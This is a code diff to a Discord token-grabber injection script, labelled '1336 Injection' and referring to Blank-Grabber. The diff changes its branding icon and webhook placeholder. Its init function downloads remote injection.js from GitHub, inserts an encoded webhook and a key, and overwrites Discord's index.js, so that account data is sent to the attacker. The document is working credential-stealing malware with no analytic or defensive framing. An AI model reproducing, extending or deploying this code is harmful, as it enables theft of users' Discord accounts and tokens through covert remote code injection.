@@ -13,9 +13,11 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone', 
   embed_name: '1336 Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png',
+  embed_icon: 'https://raw.githubusercontent.com/Nowze/antivirus69/refs/heads/main/1336-Logo-X.jpg',
   embed_color: 5639644, 
   injection_url: 'https://raw.githubusercontent.com/Nowze/antivirus69/edit/main/injection.js', 
+
+  
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
@@ -444,7 +446,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOKHEREBASE64ENCODED%', '${encodedHook}')
+        res.replace('%WEBHOOK%', '${encodedHook}')
         res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
